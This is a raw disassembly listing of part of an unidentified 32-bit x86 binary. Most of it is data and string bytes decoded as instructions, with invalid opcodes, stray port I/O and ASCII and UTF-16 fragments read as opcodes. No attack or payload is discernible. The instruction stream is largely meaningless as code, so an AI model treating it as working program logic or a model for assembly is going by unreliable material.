  427e24:	and    DWORD PTR [eax-0x587f8e19],eax
  427e2a:	adc    eax,0xed8abaed
  427e2f:	mov    esp,0xd505a28a
  427e34:	pop    eax
  427e35:	fist   WORD PTR [ecx]
  427e37:	mov    ds:0xdf58d54b,al
  427e3c:	adc    DWORD PTR [edx+0x6a532988],esi
  427e42:	mov    ds:0x438f86c2,al
  427e47:	mov    es:0x438f86c6,al
  427e4d:	es in  al,dx
  427e4f:	sub    dl,BYTE PTR [ebx]
  427e51:	xchg   esp,eax
  427e52:	mov    esi,0x4d4d0d48
  427e57:	xchg   edi,eax
  427e58:	add    BYTE PTR [edi-0x66e27813],0x60
  427e5f:	fstp   DWORD PTR [eax-0x21]
  427e62:	adc    DWORD PTR [eax-0x10],edx
  427e65:	xor    bl,BYTE PTR [esi-0x7a]
  427e68:	pop    DWORD PTR [ebx+0x26]
  427e6b:	push   eax
  427e6c:	ja     0x427e36
  427e6e:	jl     0x427ee7
  427e70:	xchg   ah,ah
  427e72:	pop    eax
  427e73:	fist   WORD PTR [ecx]
  427e75:	push   eax
  427e76:	ja     0x427dff
  427e78:	adc    BYTE PTR [edi-0x37287fce],0x9b
  427e7f:	or     DWORD PTR [esi-0x3e],eax
  427e82:	or     al,0xb2
  427e84:	mov    BYTE PTR [eax+eax*4],cl
  427e87:	xlat   BYTE PTR ds:[ebx]
  427e88:	xor    al,BYTE PTR [eax-0x5df53719]
  427e8e:	ret    0xc7a7
  427e91:	add    al,0xd4
  427e93:	push   ebx
  427e94:	dec    ebp
  427e95:	xchg   esi,eax
  427e96:	call   FWORD PTR [eax+edx*2-0x687f7569]
  427e9d:	and    DWORD PTR [eax-0x69],edx
  427ea0:	and    DWORD PTR [ebp-0x29],ecx
  427ea3:	and    DWORD PTR [ecx],eax
  427ea5:	ja     0x427e31
  427ea7:	dec    ebp
  427ea8:	xlat   BYTE PTR ds:[ebx]
  427ea9:	out    dx,eax
  427eaa:	mov    dl,0x2
  427eac:	sub    DWORD PTR [edx],ecx
  427eae:	dec    ebp
  427eaf:	xlat   BYTE PTR ds:[ebx]
  427eb0:	and    DWORD PTR [ebp-0x29],ecx
  427eb3:	xchg   DWORD PTR [ebp-0x29],ecx
  427eb6:	xchg   BYTE PTR [ebp-0x29],cl
  427eb9:	enter  0xd74d,0x32
  427ebd:	xchg   bh,ah
  427ebf:	mov    cl,BYTE PTR [ebp+0x4d]
  427ec2:	stos   DWORD PTR es:[edi],eax
  427ec3:	push   eax
  427ec4:	ja     0x427e50
  427ec6:	xor    BYTE PTR [edi-0x76],0xa9
  427eca:	jo     0x427ec7
  427ecc:	out    dx,eax
  427ecd:	lea    edx,[edi-0x6127880]
  427ed3:	mov    ebp,ebp
  427ed5:	xchg   DWORD PTR [ebp-0x67],eax
  427ed8:	jl     0x427f4f
  427eda:	xor    eax,0x8d8d8d35
  427edf:	lea    edi,[ebp+esi*2+0x35]
  427ee3:	inc    ebp
  427ee4:	lea    ecx,[ebp+0x75018d8d]
  427eea:	xor    eax,0xd74d0a71
  427eef:	xor    eax,0x4d2dd74d
  427ef4:	xlat   BYTE PTR ds:[ebx]
  427ef5:	and    eax,0x4d1dd74d
  427efa:	xlat   BYTE PTR ds:[ebx]
  427efb:	adc    eax,0x4d71d74d
  427f00:	xlat   BYTE PTR ds:[ebx]
  427f01:	and    DWORD PTR [ebp-0x29],ecx
  427f04:	out    dx,eax
  427f05:	xchg   cl,bl
  427f07:	mov    eax,0x77804d4d
  427f0c:	out    dx,eax
  427f0d:	push   eax
  427f0e:	jne    0x427f45
  427f10:	out    dx,al
  427f11:	xor    BYTE PTR [ebp+0x35],0x35
  427f15:	dec    edi
  427f16:	push   0x9
  427f18:	prefetcht0 BYTE PTR [ebp+0x75808d8d]
  427f1f:	xor    eax,0x96a4f45
  427f24:	(bad)  
  427f26:	lea    ecx,[ebp+0x35d54d8d]
  427f2c:	and    eax,0x2535d54d
  427f31:	dec    ebp
  427f32:	aad    0x35
  427f34:	and    eax,0x81357580
  427f39:	dec    ebp
  427f3a:	test   DWORD PTR [eax-0x7f11ca8b],0x80ee3575
  427f44:	jne    0x427f7b
  427f46:	out    dx,al
  427f47:	add    DWORD PTR [edi-0x12],esi
  427f4a:	push   eax
  427f4b:	jne    0x427f82
  427f4d:	out    dx,eax
  427f4e:	xor    BYTE PTR [ebp+0x35],0x3d
  427f52:	in     al,dx
  427f53:	jne    0x427f8a
  427f55:	out    dx,al
  427f56:	push   eax
  427f57:	jne    0x427f8e
  427f59:	out    dx,al
  427f5a:	xor    BYTE PTR [ebp+0x35],0xee
  427f5e:	xor    BYTE PTR [ebp+0x35],0xee
  427f62:	xor    BYTE PTR [ecx],0x35
  427f65:	out    dx,al
  427f66:	adc    BYTE PTR [eax+0x26],0x3a
  427f6a:	lea    ecx,[ebp-0x2a7ff180]
  427f70:	xor    eax,0x2ecd80ef
  427f75:	cmp    cl,BYTE PTR [ebp+0x9195f8d]
  427f7b:	jmp    0x7180:0x8d8d3a16
  427f82:	add    BYTE PTR [ecx+0x165aa80],0x95
  427f89:	sbb    DWORD PTR [edx],ecx
  427f8b:	sub    BYTE PTR [esi-0x80],0x90
  427f8f:	in     al,dx
  427f90:	jle    0x427f12
  427f92:	aad    0x35
  427f94:	out    dx,eax
  427f95:	pop    edi
  427f96:	sbb    DWORD PTR [ecx],ecx
  427f98:	in     eax,dx
  427f99:	fstp   TBYTE PTR [edx]
  427f9b:	lea    ecx,[ebp-0x10ca6a80]
  427fa1:	sub    BYTE PTR [esi-0x80],0xa6
  427fa5:	or     BYTE PTR [ebp-0x4d13aebd],0x50
  427fac:	or     al,0xbe
  427fae:	sar    BYTE PTR [edx],1
  427fb0:	lea    ecx,[ebp+0x45357580]
  427fb6:	dec    edi
  427fb7:	push   0x9
  427fb9:	dec    edi
  427fba:	cdq    
  427fbb:	cmp    cl,BYTE PTR [ebp+0x3575808d]
  427fc1:	out    dx,al
  427fc2:	or     ch,0x2e
  427fc5:	cmp    cl,BYTE PTR [ebp+0x508d808d]
  427fcb:	jne    0x428002
  427fcd:	and    DWORD PTR [eax-0x7f11ca8b],eax
  427fd3:	int    0x26
  427fd5:	cmp    cl,BYTE PTR [ebp+0x508d808d]
  427fdb:	jne    0x428012
  427fdd:	and    DWORD PTR [eax-0x7f11ca8b],eax
  427fe3:	int    0x10
  427fe5:	cmp    cl,BYTE PTR [ebp-0x7f727f73]
  427feb:	lea    edx,[eax+0x75]
  427fee:	xor    eax,0x35758021
  427ff3:	out    dx,al
  427ff4:	or     ch,0x41
  427ff7:	cmp    cl,BYTE PTR [ebp-0x7f727f73]
  427ffd:	lea    edx,[eax+0x75]
  428000:	xor    eax,0x35758021
  428005:	out    dx,al
  428006:	xor    BYTE PTR [ecx],0x35
  428009:	out    dx,al
  42800a:	or     ch,0x82
  42800d:	cmp    cl,BYTE PTR [ebp-0x7daf7f73]
  428013:	cmp    cl,BYTE PTR [ebp-0x7f727f73]
  428019:	xor    dl,bh
  42801b:	and    ah,BYTE PTR [edi+ebp*2]
  42801e:	cmp    BYTE PTR [ebx-0x4],dl
  428021:	in     eax,dx
  428022:	add    eax,0xc86b20d
  428027:	mov    dl,0xba
  428029:	sub    edi,edi
  42802b:	std    
  42802c:	push   eax
  42802d:	xor    DWORD PTR ds:0x35757c21,esi
  428033:	out    dx,eax
  428034:	lea    ecx,[ebp+0x75808d8d]
  42803a:	xor    eax,0xd56a4f35
  42803f:	ret    
  428040:	xor    BYTE PTR [ebp+0x35],0x71
  428044:	in     eax,dx
  428045:	xchg   BYTE PTR [ebp-0x2a82272b],cl
  42804b:	push   ebx
  42804c:	jge    0x4280cb
  42804e:	aad    0x23
  428050:	jge    0x428029
  428052:	fmul   DWORD PTR [ebp-0x2b]
  428055:	xor    eax,0x35d54d2d
  42805a:	sub    eax,0x2d35d54d
  42805f:	dec    ebp
  428060:	aad    0x35
  428062:	sub    eax,0x55357580
  428067:	dec    ebp
  428068:	test   esp,0x35d54d39
  42806e:	and    eax,0x2535d54d
  428073:	dec    ebp
  428074:	aad    0x35
  428076:	and    eax,0x81357580
  42807b:	dec    ebp
  42807c:	test   esp,0x35d54d90
  428082:	adc    eax,0x3d357580
  428087:	dec    ebp
  428088:	test   esp,0x3575806f
  42808e:	xor    eax,0x7550f74d
  428093:	xor    eax,0x357580ef
  428098:	and    DWORD PTR [edi+0x6a],ecx
  42809b:	aad    0xa1
  42809d:	xor    BYTE PTR [ebp+0x35],0xee
  4280a1:	jl     0x428070
  4280a3:	test   BYTE PTR [edx],bh
  4280a5:	lea    ecx,[ebp+0x386f24f5]
  4280ab:	xor    BYTE PTR [ebp+0x35],0xef
  4280af:	xor    BYTE PTR [ecx],0x35
  4280b2:	out    dx,al
  4280b3:	adc    BYTE PTR [eax-0x7d],0x3a
  4280b7:	lea    ecx,[ebp+0x757c3a50]
  4280bd:	xor    eax,0x6f24f6ef
  4280c2:	cmp    BYTE PTR [eax-0x7f10ca8b],al
  4280c8:	xor    DWORD PTR ds:0xedfc53ef,esi
  4280ce:	add    eax,0x29bab20d
  4280d3:	mov    dl,0x86
  4280d5:	or     al,0xff
  4280d7:	mov    dl,0x80
  4280d9:	xor    DWORD PTR ds:0xd7b26321,esi
  4280df:	and    eax,DWORD PTR [eax-0x7f11ca8b]
  4280e5:	xor    DWORD PTR ds:0x835080ee,esi
  4280eb:	cmp    cl,BYTE PTR [ebp-0x7f91b273]
  4280f1:	int    0x32
  4280f3:	cmp    cl,BYTE PTR [ebp+0x3d0a4d8d]
  4280f9:	les    ebx,FWORD PTR [edi]
  4280fb:	add    DWORD PTR [edi-0x12],esi
  4280fe:	push   eax
  4280ff:	jne    0x428136
  428101:	and    DWORD PTR [eax-0x7fdeca8b],eax
  428107:	xor    DWORD PTR ds:0xe55080ee,esi
  42810d:	cmp    cl,BYTE PTR [ebp+0x3a30808d]
  428113:	out    dx,eax
  428114:	xor    BYTE PTR [ebp+0x35],0xee
  428118:	or     ch,0x87
  42811b:	cmp    cl,BYTE PTR [ebp-0x7f10b273]
  428121:	xor    DWORD PTR ds:0x865080ee,esi
  428127:	cmp    cl,BYTE PTR [ebp+0x18d808d]
  42812d:	out    dx,al
  42812e:	mov    ds:0xee353180,al
  428133:	adc    BYTE PTR [eax-0x1b],0x3a
  428137:	lea    ecx,[ebp+0x30808d80]
  42813d:	cmp    ch,bh
  42813f:	test   eax,0xfba7b880
  428144:	sub    eax,0x614c748d
  428149:	imul   edi,DWORD PTR [ecx+0x62],0x69
  42814d:	popa   
  42814e:	push   0x6c656548
  428153:	ins    BYTE PTR es:[edi],dx
  428154:	outs   dx,DWORD PTR ds:[esi]
  428155:	ja     0x428157
  428157:	popa   
  428158:	ins    DWORD PTR es:[edi],dx
  428159:	imul   edi,DWORD PTR [edx+0x65],0x676f6e70
  428160:	push   ebp
  428161:	outs   dx,BYTE PTR ds:[esi]
  428162:	bound  esp,QWORD PTR [ebp+0x0]
  428165:	push   0x6572576d
  42816a:	outs   dx,BYTE PTR ds:[esi]
  42816b:	jne    0x4281d1
  42816d:	outs   dx,DWORD PTR ds:[esi]
  42816e:	popa   
  42816f:	push   0x6b637573
  428174:	add    BYTE PTR [ebp+0x6f],cl
  428177:	ins    DWORD PTR es:[edi],dx
  428178:	imul   ecx,DWORD PTR [ebp+0x75],0x6c617367
  42817f:	jo     0x4281e6
  428181:	je     0x428183
  428183:	dec    edx
  428184:	gs jae 0x4281fa
  428187:	ins    BYTE PTR es:[edi],dx
  428188:	outs   dx,DWORD PTR ds:[esi]
  428189:	dec    edi
  42818a:	js     0x4281f1
  42818c:	outs   dx,BYTE PTR ds:[esi]
  42818d:	outs   dx,DWORD PTR ds:[esi]
  42818e:	jb     0x4281f1
  428190:	add    BYTE PTR [edi+0x6f],al
  428193:	ja     0x4281f9
  428195:	dec    ebp
  428196:	imul   esi,DWORD PTR [ebx+0x6f],0x706179
  42819d:	imul   esi,DWORD PTR fs:[eax+0x6f],0x6d6f6d72
  4281a5:	imul   esp,DWORD PTR [ebx+0x6b],0x6c6c4900
  4281ac:	jae    0x42821b
  4281ae:	popa   
  4281af:	fs jns 0x428221
  4281b2:	imul   ebp,DWORD PTR [ecx+0x0],0x6b
  4281b6:	imul   esi,DWORD PTR [edx+0x7a],0x64756261
  4281bd:	bound  esi,QWORD PTR [ebp+0x6d]
  4281c0:	add    BYTE PTR [ebp+0x72],al
  4281c3:	outs   dx,DWORD PTR ds:[si]
  4281c5:	jo     0x428228
  4281c7:	jns    0x42822f
  4281c9:	imul   edi,DWORD PTR [eax+0x0],0x6d736e6f
  4281d0:	jne    0x42823f
  4281d2:	popa   
  4281d3:	gs fs jo 0x42823c
  4281d7:	imul   esi,DWORD PTR [esi+0x79],0x67756800
  4281de:	dec    esp
  4281df:	outs   dx,DWORD PTR ds:[esi]
  4281e0:	jne    0x428246
  4281e2:	push   0x6d6d7069
  4281e7:	add    BYTE PTR [edi+0x6c],al
  4281ea:	outs   dx,DWORD PTR ds:[esi]
  4281eb:	jo     0x428240
  4281ed:	ja     0x42825e
  4281ef:	bound  eax,QWORD PTR [eax]
  4281f1:	jns    0x428262
  4281f3:	pop    ecx
  4281f4:	gs ins BYTE PTR es:[edi],dx
  4281f6:	jo     0x428251
  4281f8:	jne    0x428266
  4281fa:	gs gs jae 0x42825f
  4281fe:	popa   
  4281ff:	add    BYTE PTR [ecx+0x77],ah
  428202:	popa   
  428203:	inc    esi
  428204:	imul   ebp,DWORD PTR [esi+0x65],0x4f706173
  42820b:	outs   dx,BYTE PTR ds:[esi]
  42820c:	je     0x42827d
  42820e:	add    BYTE PTR [ebp+0x73],ah
  428211:	dec    esp
  428212:	imul   ebp,DWORD PTR [esi+0x67],0x68737574
  428219:	ins    BYTE PTR es:[edi],dx
  42821a:	outs   dx,DWORD PTR ds:[esi]
  42821b:	bound  esp,QWORD PTR [ebp+0x0]
  42821e:	push   0x617a6761
  428223:	bound  ebp,QWORD PTR [edi+0x75]
  428226:	jo     0x428228
  428228:	inc    edx
  428229:	outs   dx,DWORD PTR ds:[esi]
  42822a:	jb     0x4282a0
  42822c:	popa   
  42822d:	js     0x42829e
  42822f:	data16 jo 0x428297
  428232:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x776f0077
  42823a:	fs gs popa 
  42823d:	outs   dx,DWORD PTR fs:[esi]
  42823f:	jae    0x4282b9
  428241:	jne    0x428243
  428243:	inc    edi
  428244:	add    BYTE PTR [edi+0x0],ch
  428247:	add    BYTE PTR gs:[ebx+0x0],dh
  42824b:	dec    edx
  42824c:	add    BYTE PTR [ecx+0x0],ah
  42824f:	jbe    0x428251
  428251:	popa   
  428252:	add    BYTE PTR [eax],al
  428254:	add    BYTE PTR [edx+0x0],al
  428257:	popa   
  428258:	add    BYTE PTR [edx+0x0],ah
  42825b:	jne    0x42825d
  42825d:	outs   dx,DWORD PTR ds:[esi]
  42825e:	add    BYTE PTR [ebp+0x0],ch
  428261:	push   0x6d00
  428266:	add    BYTE PTR [edx+0x0],dh
  428269:	popa   
  42826a:	add    BYTE PTR [eax+eax*1+0x74],dh
  42826e:	add    BYTE PTR [ecx+0x0],ah
  428271:	ins    DWORD PTR es:[edi],dx
  428272:	add    BYTE PTR [edi+0x0],ah
  428275:	popa   
  428276:	add    BYTE PTR [ecx+0x0],bh
  428279:	js     0x42827b
  42827b:	imul   eax,DWORD PTR [eax],0x610000
  428281:	ins    DWORD PTR es:[edi],dx
  428282:	add    BYTE PTR [ecx+0x0],ah
  428285:	ins    BYTE PTR es:[edi],dx
  428286:	add    BYTE PTR [edx+0x0],ah
  428289:	outs   dx,DWORD PTR ds:[esi]
  42828a:	add    BYTE PTR [edi+0x0],ch
  42828d:	popa   
  42828e:	add    BYTE PTR [eax+0x0],dh
  428291:	jo     0x428293
  428293:	add    BYTE PTR [eax],al
  428295:	popa   
  428296:	add    BYTE PTR [esi+0x0],dh
  428299:	popa   
  42829a:	add    BYTE PTR [edi+0x0],ah
  42829d:	outs   dx,DWORD PTR ds:[esi]
  42829e:	add    BYTE PTR [ebx+0x0],dh
  4282a1:	push   0x77006f00
  4282a6:	add    BYTE PTR [eax+eax*1+0x65],ch
  4282aa:	add    BYTE PTR [ebp+0x0],dh
  4282ad:	add    BYTE PTR fs:[ebp+0x0],ah
  4282b1:	add    BYTE PTR fs:[eax],al
  4282b4:	add    BYTE PTR [eax+0x0],cl
  4282b7:	popa   
  4282b8:	add    BYTE PTR [edx+0x0],dh
  4282bb:	add    BYTE PTR gs:[edx+0x0],al
  4282bf:	imul   eax,DWORD PTR [eax],0x6b0072
  4282c5:	arpl   WORD PTR [eax],ax
  4282c7:	popa   
  4282c8:	add    BYTE PTR [ebp+0x0],ch
  4282cb:	add    BYTE PTR [eax],al
  4282cd:	imul   eax,DWORD PTR [eax],0x61
  4282d0:	add    BYTE PTR [edi+0x0],dh
  4282d3:	popa   
  4282d4:	add    BYTE PTR [eax+0x0],bh
  4282d7:	outs   dx,DWORD PTR ds:[esi]
  4282d8:	add    BYTE PTR [edi+0x0],ch
  4282db:	je     0x4282dd
  4282dd:	add    BYTE PTR [eax],al
  4282df:	jb     0x4282e1
  4282e1:	jne    0x4282e3
  4282e3:	add    BYTE PTR gs:[ecx+0x0],ah
  4282e7:	ins    BYTE PTR es:[edi],dx
  4282e8:	add    BYTE PTR [eax+eax*1+0x68],ch
  4282ec:	add    BYTE PTR [ebp+0x0],ch
  4282ef:	ins    DWORD PTR es:[edi],dx
  4282f0:	add    BYTE PTR [eax],al
  4282f2:	add    BYTE PTR [edi+0x0],ch
  4282f5:	add    BYTE PTR gs:[eax+0x0],bh
  4282f9:	imul   eax,DWORD PTR [eax],0x650072
  4282ff:	ja     0x428301
  428301:	outs   dx,DWORD PTR ds:[esi]
  428302:	add    BYTE PTR [ebp+0x0],ah
  428305:	popa   
  428306:	add    BYTE PTR [edx+0x0],ah
  428309:	ins    BYTE PTR es:[edi],dx
  42830a:	add    BYTE PTR [ecx+0x0],ch
  42830d:	add    BYTE PTR [eax],al
  42830f:	jne    0x428311
  428311:	ins    DWORD PTR es:[edi],dx
  428312:	add    BYTE PTR [esi+0x0],ch
  428315:	outs   dx,DWORD PTR ds:[esi]
  428316:	add    BYTE PTR [edi+0x0],ah
  428319:	bound  eax,QWORD PTR [eax]
  42831b:	popa   
  42831c:	add    BYTE PTR [esi+0x0],dh
  42831f:	outs   dx,DWORD PTR ds:[esi]
  428320:	add    BYTE PTR [edi+0x0],dh
  428323:	bound  eax,QWORD PTR [eax]
  428325:	add    BYTE PTR gs:[eax+eax*1+0x0],ch
  42832a:	add    BYTE PTR [eax],al
  42832c:	add    bh,dh
  42832e:	sub    al,0x10
  428330:	add    BYTE PTR [esi],bl
  428332:	aaa    
  428333:	adc    BYTE PTR [eax],al
  428335:	and    al,0x42
  428337:	adc    BYTE PTR [eax],al
  428339:	rol    BYTE PTR [eax+edx*1],cl
  42833c:	add    ch,dh
  42833e:	xor    BYTE PTR [eax],dl
  428340:	add    BYTE PTR [esi-0x1affefcf],dh
  428346:	cmp    dl,BYTE PTR [eax]
  428348:	add    BYTE PTR [ebx],dh
  42834a:	ins    BYTE PTR es:[edi],dx
  42834b:	adc    BYTE PTR [eax],al
  42834d:	sub    DWORD PTR [eax+edx*1+0x0],esp
  428351:	push   ecx
  428352:	inc    ecx
  428353:	adc    BYTE PTR [eax],al
  428355:	mov    cl,0x60
  428357:	adc    BYTE PTR [eax],al
  428359:	aas    
  42835a:	or     al,0x10
  42835c:	add    al,bh
  42835e:	and    DWORD PTR [eax],edx
  428360:	add    BYTE PTR [edx+0x37],dl
  428363:	adc    BYTE PTR [eax],al
  428365:	test   eax,0xa3001054
  42836a:	add    DWORD PTR [eax],edx
  42836c:	add    BYTE PTR [edi],ah
  42836e:	push   esp
  42836f:	adc    BYTE PTR [eax],al
  428371:	cmc    
  428372:	push   esi
  428373:	adc    BYTE PTR [eax],al
  428375:	imul   ecx,DWORD PTR [ebx],0x10
  428378:	add    BYTE PTR ds:0x31004283,ch
  42837e:	add    DWORD PTR [edx+0x0],0x35
  428382:	add    DWORD PTR [edx+0x0],0x39
  428386:	add    DWORD PTR [edx+0x0],0x3d
  42838a:	add    DWORD PTR [edx+0x0],0x41
  42838e:	add    DWORD PTR [edx+0x0],0x45
  428392:	add    DWORD PTR [edx+0x0],0x49
  428396:	add    DWORD PTR [edx+0x0],0x4d
  42839a:	add    DWORD PTR [edx+0x0],0x51
  42839e:	add    DWORD PTR [edx+0x0],0x55
  4283a2:	add    DWORD PTR [edx+0x0],0x59
  4283a6:	add    DWORD PTR [edx+0x0],0x5d
  4283aa:	add    DWORD PTR [edx+0x0],0x61
  4283ae:	add    DWORD PTR [edx+0x0],0x65
  4283b2:	add    DWORD PTR [edx+0x0],0x69
  4283b6:	add    DWORD PTR [edx+0x0],0x6d
  4283ba:	add    DWORD PTR [edx+0x0],0x71
  4283be:	add    DWORD PTR [edx+0x0],0x75
  4283c2:	add    DWORD PTR [edx+0x0],0x5
  4283c6:	test   BYTE PTR [edx+0x0],al
  4283c9:	or     DWORD PTR [edx+eax*2+0x42840d00],eax
  4283d0:	add    BYTE PTR [ecx],dl
  4283d2:	test   BYTE PTR [edx+0x0],al
  4283d5:	adc    eax,0x19004284
  4283da:	test   BYTE PTR [edx+0x0],al
  4283dd:	sbb    eax,0x21004284
  4283e2:	test   BYTE PTR [edx+0x0],al
  4283e5:	and    eax,0x29004284
  4283ea:	test   BYTE PTR [edx+0x0],al
  4283ed:	sub    eax,0x31004284
  4283f2:	test   BYTE PTR [edx+0x0],al
  4283f5:	xor    eax,0x39004284
  4283fa:	test   BYTE PTR [edx+0x0],al
  4283fd:	cmp    eax,0x41004284
  428402:	test   BYTE PTR [edx+0x0],al
  428405:	arpl   WORD PTR [eax],si
  428407:	adc    BYTE PTR [eax],al
  428409:	push   ecx
  42840a:	xor    DWORD PTR [eax],edx
  42840c:	add    BYTE PTR [edi+ebx*2+0x10],ch
  428410:	add    BYTE PTR [ebx-0x5ffefc3],bl
  428416:	aaa    
  428417:	adc    BYTE PTR [eax],al
  428419:	(bad)  
  42841a:	pop    esi
  42841b:	adc    BYTE PTR [eax],al
  42841d:	call   0x1040:0xa400106a
  428424:	add    BYTE PTR [esi+0x23],ah
  428427:	adc    BYTE PTR [eax],al
  428429:	xor    DWORD PTR [eax],ebx
  42842b:	adc    BYTE PTR [eax],al
  42842d:	mov    edi,DWORD PTR [edi]
  42842f:	adc    BYTE PTR [eax],al
  428431:	and    BYTE PTR [ecx+0x10],0x0
  428435:	clc    
  428436:	ja     0x428448
  428438:	add    BYTE PTR [eax],dh
  42843a:	xor    dl,BYTE PTR [eax]
  42843c:	add    BYTE PTR [edx+esi*2+0x6bfb0010],ch
  428443:	adc    BYTE PTR [eax],al
  428445:	mov    fs,WORD PTR [ebx+0x10]
  428448:	add    BYTE PTR [ecx+0x6200107e],bl
  42844e:	daa    
  42844f:	adc    BYTE PTR [eax],al
  428451:	mov    edi,0x2e001069
  428456:	sub    eax,0x413c0010
  42845b:	adc    BYTE PTR [eax],al
  42845d:	xor    BYTE PTR [eax],dh
  42845f:	adc    BYTE PTR [eax],al
  428461:	outs   dx,BYTE PTR ds:[esi]
  428462:	dec    edi
  428463:	adc    BYTE PTR [eax],al
  428465:	adc    eax,0xeb001025
  42846a:	bound  edx,QWORD PTR [eax]
  42846c:	add    BYTE PTR [edi],dh
  42846e:	and    dl,BYTE PTR [eax]
  428470:	add    BYTE PTR [ebx+0x1a],bl
  428473:	adc    BYTE PTR [eax],al
  428475:	mov    BYTE PTR [esi+0x10],ch
  428478:	add    BYTE PTR [esi],ah
  42847a:	pusha  
  42847b:	adc    BYTE PTR [eax],al
  42847d:	pop    es
  42847e:	adc    eax,0x1ca50010
  428483:	adc    BYTE PTR [eax],al
  428485:	inc    ebp
  428486:	test   BYTE PTR [edx+0x0],al
  428489:	dec    ecx
  42848a:	test   BYTE PTR [edx+0x0],al
  42848d:	dec    ebp
  42848e:	test   BYTE PTR [edx+0x0],al
  428491:	push   ecx
  428492:	test   BYTE PTR [edx+0x0],al
  428495:	push   ebp
  428496:	test   BYTE PTR [edx+0x0],al
  428499:	pop    ecx
  42849a:	test   BYTE PTR [edx+0x0],al
  42849d:	pop    ebp
  42849e:	test   BYTE PTR [edx+0x0],al
  4284a1:	popa   
  4284a2:	test   BYTE PTR [edx+0x0],al
  4284a5:	test   BYTE PTR gs:[edx+0x0],al
  4284a9:	imul   eax,DWORD PTR [edx+eax*2+0x42846d00],0x42847100
  4284b4:	add    BYTE PTR [ebp-0x7c],dh
  4284b7:	inc    edx
  4284b8:	add    BYTE PTR [ecx-0x7c],bh
  4284bb:	inc    edx
  4284bc:	add    BYTE PTR [ebp-0x7c],bh
  4284bf:	inc    edx
  4284c0:	add    BYTE PTR [ecx-0x5affbd7c],al
  4284c6:	das    
  4284c7:	adc    BYTE PTR [eax],al
  4284c9:	add    bh,BYTE PTR [esi+0x10]
  4284cc:	add    BYTE PTR [ebx],ch
  4284ce:	adc    al,0x10
  4284d0:	add    BYTE PTR ds:0x4b001060,ah
  4284d6:	pop    edx
  4284d7:	adc    BYTE PTR [eax],al
  4284d9:	dec    ecx
  4284da:	jne    0x4284ec
  4284dc:	add    dh,ch
  4284de:	pop    esp
  4284df:	adc    BYTE PTR [eax],al
  4284e1:	push   edx
  4284e2:	cmp    eax,0x529b0010
  4284e7:	adc    BYTE PTR [eax],al
  4284e9:	pop    ss
  4284ea:	cmp    dl,BYTE PTR [eax]
  4284ec:	add    BYTE PTR [ebp-0x64ffef93],cl
  4284f2:	xor    eax,0x158d0010
  4284f7:	adc    BYTE PTR [eax],al
  4284f9:	adc    DWORD PTR [edi+0x10],ebp
  4284fc:	add    BYTE PTR [ecx+0x51],ch
  4284ff:	adc    BYTE PTR [eax],al
  428501:	jmp    0x42850f
  428503:	adc    BYTE PTR [eax],al
  428505:	lds    eax,FWORD PTR [edx+eax*2+0x4284c900]
  42850c:	add    ch,cl
  42850e:	test   BYTE PTR [edx+0x0],al
  428511:	rol    DWORD PTR [edx+eax*2+0x4284d500],1
  428518:	add    cl,bl
  42851a:	test   BYTE PTR [edx+0x0],al
  42851d:	fld    QWORD PTR [edx+eax*2+0x4284e100]
  428524:	add    ch,ah
  428526:	test   BYTE PTR [edx+0x0],al
  428529:	jmp    0xed42c7b2
  42852e:	test   BYTE PTR [edx+0x0],al
  428531:	icebp  
  428532:	test   BYTE PTR [edx+0x0],al
  428535:	cmc    
  428536:	test   BYTE PTR [edx+0x0],al
  428539:	stc    
  42853a:	test   BYTE PTR [edx+0x0],al
  42853d:	std    
  42853e:	test   BYTE PTR [edx+0x0],al
  428541:	add    DWORD PTR [ebp+0x45d70042],eax
  428547:	adc    BYTE PTR [eax],al
  428549:	xlat   BYTE PTR ds:[ebx]
  42854a:	pusha  
  42854b:	adc    BYTE PTR [eax],al
  42854d:	lea    ebp,[eax+edx*1+0x0]
  428551:	hlt    
  428552:	add    BYTE PTR [eax],dl
  428554:	add    BYTE PTR [esp+esi*2],dl
  428557:	adc    BYTE PTR [eax],al
  428559:	out    0x44,al
  42855b:	adc    BYTE PTR [eax],al
  42855d:	dec    esi
  42855e:	bound  edx,QWORD PTR [eax]
  428560:	add    BYTE PTR [edi+ebp*2],ch
  428563:	adc    BYTE PTR [eax],al
  428565:	cmp    ebx,DWORD PTR [ebx]
  428567:	adc    BYTE PTR [eax],al
  428569:	inc    ebp
  42856a:	pop    ecx
  42856b:	adc    BYTE PTR [eax],al
  42856d:	imul   BYTE PTR [ecx+0x10]
  428570:	add    BYTE PTR [esi],ah
  428572:	arpl   WORD PTR [eax],dx
  428574:	add    BYTE PTR [ebp-0x4fffefee],bh
  42857a:	sbb    edx,DWORD PTR [eax]
  42857c:	add    BYTE PTR [ebx],ah
  42857e:	adc    BYTE PTR ds:[eax],al
  428581:	xchg   ebx,eax
  428582:	push   ecx
  428583:	adc    BYTE PTR [eax],al
  428585:	inc    ebp
  428586:	test   DWORD PTR [edx+0x0],eax
  428589:	dec    ecx
  42858a:	test   DWORD PTR [edx+0x0],eax
  42858d:	dec    ebp
  42858e:	test   DWORD PTR [edx+0x0],eax
  428591:	push   ecx
  428592:	test   DWORD PTR [edx+0x0],eax
  428595:	push   ebp
  428596:	test   DWORD PTR [edx+0x0],eax
  428599:	pop    ecx
  42859a:	test   DWORD PTR [edx+0x0],eax
  42859d:	pop    ebp
  42859e:	test   DWORD PTR [edx+0x0],eax
  4285a1:	popa   
  4285a2:	test   DWORD PTR [edx+0x0],eax
  4285a5:	test   DWORD PTR gs:[edx+0x0],eax
  4285a9:	imul   eax,DWORD PTR [ebp-0x7a92ffbe],0x85710042
  4285b3:	inc    edx
  4285b4:	add    BYTE PTR [ebp-0x7b],dh
  4285b7:	inc    edx
  4285b8:	add    BYTE PTR [ecx-0x7b],bh
  4285bb:	inc    edx
  4285bc:	add    BYTE PTR [ebp-0x7b],bh
  4285bf:	inc    edx
  4285c0:	add    BYTE PTR [ecx+0x4285],al
	...
  4285d2:	add    BYTE PTR [eax],al
  4285d4:	sub    ch,dl
  4285d6:	mov    dh,0x4f
  4285d8:	add    BYTE PTR [eax],al
  4285da:	add    BYTE PTR [eax],al
  4285dc:	inc    eax
  4285dd:	xchg   esi,eax
  4285de:	add    al,BYTE PTR [eax]
  4285e0:	add    DWORD PTR [eax],eax
  4285e2:	add    BYTE PTR [eax],al
  4285e4:	add    DWORD PTR [eax],eax
  4285e6:	add    BYTE PTR [eax],al
  4285e8:	add    DWORD PTR [eax],eax
  4285ea:	add    BYTE PTR [eax],al
  4285ec:	adc    BYTE PTR [esi-0x69cffffe],dl
  4285f2:	add    al,BYTE PTR [eax]
